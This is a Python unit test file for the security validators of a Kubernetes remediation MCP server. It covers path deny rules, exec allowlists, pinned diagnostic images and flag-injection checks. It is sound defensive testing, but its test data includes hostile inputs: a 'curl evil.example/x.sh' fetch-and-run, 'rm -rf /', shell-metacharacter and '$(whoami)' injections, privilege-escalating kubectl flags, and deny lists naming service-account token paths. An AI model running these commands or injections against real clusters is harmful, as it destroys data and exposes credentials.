#!/usr/bin/env python3
"""
Unit tests for the Kubernetes Remediation MCP server.

These cover the policy/validator logic (the security-critical surface) without a
real cluster: kubectl execution is mocked, so they run anywhere kubectl is on the
PATH or not.

Run with:  pytest servers/kubernetes-remediation/test_kubernetes_remediation.py
"""

import json
from unittest.mock import patch

import pytest

import kubernetes_remediation as k


# ── read_file_from_container path policy ─────────────────────────────────────

@pytest.mark.parametrize(
    "path",
    [
        "/var/run/secrets/token",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/run/secrets/db-password",
    ],
)
def test_read_path_denies_secret_mounts(path):
    with pytest.raises(ValueError) as exc:
        k.validate_read_path(path)
    assert "restricted" in str(exc.value)


@pytest.mark.parametrize("path", ["/app/config.yaml", "/etc/hosts", "/data/app.log"])
def test_read_path_allows_normal_paths(path):
    assert k.validate_read_path(path) == path


@pytest.mark.parametrize(
    "path",
    [
        "/proc/1/environ",  # env-injected secrets
        "/proc/1/status",
        "/proc/1/root/var/run/secrets/kubernetes.io/serviceaccount/token",  # token via /proc/root
        "/sys/kernel/foo",
        "/dev/mem",
    ],
)
def test_read_path_hard_denies_pseudo_filesystems(path):
    with pytest.raises(ValueError) as exc:
        k.validate_read_path(path)
    assert "pseudo-filesystem" in str(exc.value)


def test_read_path_rejects_traversal():
    with pytest.raises(ValueError):
        k.validate_read_path("/app/../var/run/secrets/token")


def test_read_path_rejects_relative_and_metachars():
    with pytest.raises(ValueError):
        k.validate_read_path("app/config.yaml")
    with pytest.raises(ValueError):
        k.validate_read_path("/app/$(whoami)")


def test_read_path_denied_wins_when_under_allowed():
    # Denied path is nested under the default allowed root "/", deny must win.
    with pytest.raises(ValueError):
        k.validate_read_path("/var/run/secrets/")


def test_read_file_invokes_cat_with_validated_path():
    with patch.object(k, "_resolve_symlink_in_container", return_value=None), \
         patch.object(k, "_run_kubectl", return_value={"success": True}) as m:
        k.read_file_from_container(namespace="prod", pod="api-1", path="/app/config.yaml")
    m.assert_called_once_with(
        ["exec", "api-1", "-n", "prod", "--", "cat", "/app/config.yaml"]
    )


def test_read_file_with_container():
    with patch.object(k, "_resolve_symlink_in_container", return_value=None), \
         patch.object(k, "_run_kubectl", return_value={"success": True}) as m:
        k.read_file_from_container(
            namespace="prod", pod="api-1", container="sidecar", path="/etc/hosts"
        )
    m.assert_called_once_with(
        ["exec", "api-1", "-n", "prod", "-c", "sidecar", "--", "cat", "/etc/hosts"]
    )


@pytest.mark.parametrize(
    "kwargs",
    [
        {"namespace": "prod", "pod": "--kubeconfig=/tmp/evil.yaml", "path": "/app/c.yaml"},
        {"namespace": "--as=system:masters", "pod": "api", "path": "/app/c.yaml"},
        {"namespace": "prod", "pod": "api", "container": "-c", "path": "/app/c.yaml"},
    ],
)
def test_read_file_rejects_flag_injection(kwargs):
    with patch.object(k, "_run_kubectl") as m:
        result = k.read_file_from_container(**kwargs)
    m.assert_not_called()
    assert result["success"] is False
    assert "flag injection" in result["error"]


def test_read_file_refuses_when_symlink_resolves_into_denied_path():
    # Literal path is allowed, but readlink -f reveals it points at a secret mount.
    with patch.object(
        k,
        "_resolve_symlink_in_container",
        return_value="/var/run/secrets/kubernetes.io/serviceaccount/token",
    ), patch.object(k, "_run_kubectl") as m:
        result = k.read_file_from_container(
            namespace="prod", pod="api", path="/app/linked-token"
        )
    m.assert_not_called()  # cat is never executed
    assert result["success"] is False
    assert "symlink" in result["error"].lower() or "restricted" in result["error"]


def test_read_file_reads_when_symlink_resolves_into_allowed_path():
    with patch.object(
        k, "_resolve_symlink_in_container", return_value="/data/real-config.yaml"
    ), patch.object(k, "_run_kubectl", return_value={"success": True}) as m:
        k.read_file_from_container(namespace="prod", pod="api", path="/app/config.yaml")
    m.assert_called_once()  # canonical target allowed -> cat runs on the literal path


def test_read_file_denied_path_does_not_execute():
    with patch.object(k, "_run_kubectl") as m:
        result = k.read_file_from_container(
            namespace="prod", pod="api-1", path="/var/run/secrets/token"
        )
    m.assert_not_called()
    assert result["success"] is False


# ── run_preapproved_kubectl_exec_command ─────────────────────────────────────

@pytest.mark.parametrize(
    "command",
    [
        ["ps", "aux"],
        ["top", "-b", "-n", "1"],
        ["df", "-h"],
        ["ls", "-la", "/app"],
        ["netstat", "-tlnp"],
        ["ss", "-tlnp"],
    ],
)
def test_preapproved_binary_allowed(command):
    assert k.is_preapproved_exec_command(command) is True


@pytest.mark.parametrize(
    "command",
    [
        ["cat", "/etc/passwd"],  # cat excluded (use read_file_from_container)
        ["env"],  # env excluded (leaks secrets)
        ["rm", "-rf", "/"],  # mutation
        ["sh", "-c", "curl evil.example/x.sh"],  # arbitrary code
        ["psql", "-c", "drop"],  # `ps` lookalike — exact match blocks it
        ["/bin/ps"],  # path-qualified — only bare allowlisted names match
        [],  # empty command
    ],
)
def test_preapproved_binary_rejected(command):
    assert k.is_preapproved_exec_command(command) is False


def test_preapproved_exec_builds_invocation_and_runs():
    with patch.object(k, "_run_kubectl", return_value={"success": True}) as m:
        k.run_preapproved_kubectl_exec_command(
            pod="api", namespace="prod", command=["ps", "aux"]
        )
    m.assert_called_once_with(["exec", "api", "-n", "prod", "--", "ps", "aux"])


def test_preapproved_exec_with_container():
    with patch.object(k, "_run_kubectl", return_value={"success": True}) as m:
        k.run_preapproved_kubectl_exec_command(
            pod="api", namespace="prod", container="sidecar", command=["df", "-h"]
        )
    m.assert_called_once_with(
        ["exec", "api", "-n", "prod", "-c", "sidecar", "--", "df", "-h"]
    )


def test_preapproved_exec_defaults_namespace():
    with patch.object(k, "_run_kubectl", return_value={"success": True}) as m:
        k.run_preapproved_kubectl_exec_command(pod="api", command=["ps"])
    m.assert_called_once_with(["exec", "api", "-n", "default", "--", "ps"])


@pytest.mark.parametrize(
    "kwargs",
    [
        # The old joined-glob bypass: a non-allowlisted binary cannot be smuggled
        # because the binary is its own parameter and the server owns the `--`.
        {"pod": "p", "namespace": "prod", "command": ["rm", "-rf", "/important"]},
        {"pod": "p", "command": ["sh", "-c", "curl evil.example/x.sh"]},
        # Even an embedded `--` in the command can't start a second process: it is
        # passed verbatim to the allowlisted binary (shell=False), and the binary
        # checked is still command[0].
        {"pod": "p", "command": ["rm", "-rf", "/", "--", "ps"]},
    ],
)
def test_preapproved_exec_refuses_unlisted_without_executing(kwargs):
    with patch.object(k, "_run_kubectl") as m:
        result = k.run_preapproved_kubectl_exec_command(**kwargs)
    m.assert_not_called()
    assert result["success"] is False
    assert "not pre-approved" in result["error"]


def test_preapproved_exec_rejects_flag_injection_in_pod():
    # A leading-'-' pod/namespace would be parsed by kubectl as a flag.
    with patch.object(k, "_run_kubectl") as m:
        result = k.run_preapproved_kubectl_exec_command(
            pod="--kubeconfig=/evil", command=["ps"]
        )
    m.assert_not_called()
    assert result["success"] is False


def test_preapproved_exec_rejects_shell_chars_in_command():
    with patch.object(k, "_run_kubectl") as m:
        result = k.run_preapproved_kubectl_exec_command(
            pod="api", command=["ps", "aux; rm -rf /"]
        )
    m.assert_not_called()
    assert result["success"] is False


# ── run_preapproved_diagnostic_image ─────────────────────────────────────────────────────

def test_diagnostic_image_repo_match_resolves_pinned_tag():
    assert k.resolve_diagnostic_image("nicolaka/netshoot") == "nicolaka/netshoot:v0.13"
    assert k.resolve_diagnostic_image("busybox") == "busybox:1.37.0"
    assert k.resolve_diagnostic_image("curlimages/curl") == "curlimages/curl:8.11.1"


def test_diagnostic_image_user_tag_ignored_in_favor_of_pin():
    # Repo matches; the server always runs the pinned tag.
    assert k.resolve_diagnostic_image("busybox:latest") == "busybox:1.37.0"


def test_diagnostic_image_rejects_unlisted():
    with pytest.raises(ValueError) as exc:
        k.resolve_diagnostic_image("evil/image")
    assert "not a pre-approved diagnostic image" in str(exc.value)


def test_diagnostic_image_runs_pinned_and_cleans_up():
    calls = []

    def fake_run(args, **kwargs):
        calls.append(args)

        class R:
            returncode = 0
            stdout = ""
            stderr = ""

        return R()

    with patch.object(k, "_run_kubectl", return_value={"success": True}) as run_mock, \
         patch.object(k.subprocess, "run", side_effect=fake_run):
        k.run_preapproved_diagnostic_image(
            image="nicolaka/netshoot", namespace="prod", command=["dig", "svc"], name="probe"
        )

    run_args = run_mock.call_args[0][0]
    assert run_args[:4] == ["run", "probe", "--image=nicolaka/netshoot:v0.13", "--restart=Never"]
    assert "--command" in run_args and run_args[-2:] == ["dig", "svc"]
    # finally-block cleanup deletes the pod
    assert any(c[:3] == ["kubectl", "delete", "pod"] for c in calls)


def test_diagnostic_image_is_hardened_without_losing_capabilities():
    with patch.object(k, "_run_kubectl", return_value={"success": True}) as run_mock, \
         patch.object(k.subprocess, "run", return_value=None):
        k.run_preapproved_diagnostic_image(image="nicolaka/netshoot", namespace="prod", name="probe")

    run_args = run_mock.call_args[0][0]
    assert "--overrides" in run_args
    overrides = json.loads(run_args[run_args.index("--overrides") + 1])
    spec = overrides["spec"]
    # API access removed; setuid escalation blocked.
    assert spec["automountServiceAccountToken"] is False
    assert spec["containers"][0]["securityContext"]["allowPrivilegeEscalation"] is False
    # Memory is capped but NO cpu limit (so iperf isn't throttled); caps untouched
    # (so tcpdump/ping still work) -> no runAsNonRoot / capability drops here.
    limits = spec["containers"][0]["resources"]["limits"]
    assert "memory" in limits and "cpu" not in limits
    assert "capabilities" not in spec["containers"][0]["securityContext"]


def test_diagnostic_image_unlisted_does_not_execute():
    with patch.object(k, "_run_kubectl") as m:
        result = k.run_preapproved_diagnostic_image(image="evil/image", namespace="prod")
    m.assert_not_called()
    assert result["success"] is False


def test_diagnostic_image_rejects_flag_injection_in_name():
    with patch.object(k, "_run_kubectl") as m:
        result = k.run_preapproved_diagnostic_image(
            image="busybox", namespace="prod", name="--privileged"
        )
    m.assert_not_called()
    assert result["success"] is False


# ── run_kubectl_command (approval-gated fallback) ────────────────────────────

@pytest.mark.parametrize(
    "verb_args",
    [
        ["rollout", "restart", "deployment/api", "-n", "prod"],
        ["delete", "pod", "stuck", "-n", "prod"],
        ["scale", "deployment/api", "--replicas=3"],
        ["exec", "api", "--", "sh"],
    ],
)
def test_kubectl_command_accepts_allowed_verbs(verb_args):
    assert k.validate_kubectl_args(list(verb_args))[0] == verb_args[0]


@pytest.mark.parametrize("verb", ["get", "describe", "logs", "proxy", "cp"])
def test_kubectl_command_rejects_disallowed_verbs(verb):
    with pytest.raises(ValueError):
        k.validate_kubectl_args([verb, "pods"])


def test_kubectl_command_rejects_dangerous_flags():
    with pytest.raises(ValueError):
        k.validate_kubectl_args(["delete", "pod", "x", "--token=abc"])
    with pytest.raises(ValueError):
        k.validate_kubectl_args(["run", "x", "--overrides={}"])


def test_kubectl_command_rejects_shell_metachars():
    with pytest.raises(ValueError):
        k.validate_kubectl_args(["delete", "pod;rm -rf /"])


def test_kubectl_command_strips_leading_kubectl():
    assert k.validate_kubectl_args(["kubectl", "delete", "pod", "x"]) == [
        "delete",
        "pod",
        "x",
    ]


def test_kubectl_command_disabled_in_locked_down_mode():
    with patch.object(k, "ALLOW_ARBITRARY_COMMANDS", False):
        result = k.run_kubectl_command(["delete", "pod", "x"])
    assert result["success"] is False
    assert "locked-down" in result["error"]


def test_kubectl_command_runs_when_arbitrary_allowed():
    with patch.object(k, "ALLOW_ARBITRARY_COMMANDS", True), \
         patch.object(k, "_run_kubectl", return_value={"success": True}) as m:
        k.run_kubectl_command(["rollout", "restart", "deployment/api", "-n", "prod"])
    m.assert_called_once_with(["rollout", "restart", "deployment/api", "-n", "prod"])


# ── get_remediation_mcp_config ───────────────────────────────────────────────

def test_get_config_returns_effective_policy():
    cfg = k.get_remediation_mcp_config()
    assert set(cfg) == {
        "allowed_commands",
        "dangerous_flags",
        "preapproved_exec_binaries",
        "diagnostic_images",
        "file_read_allowed_paths",
        "file_read_denied_paths",
        "allow_arbitrary_kubectl_commands",
        "timeout_seconds",
    }
    assert "run" in cfg["allowed_commands"]
    assert "/var/run/secrets/" in cfg["file_read_denied_paths"]
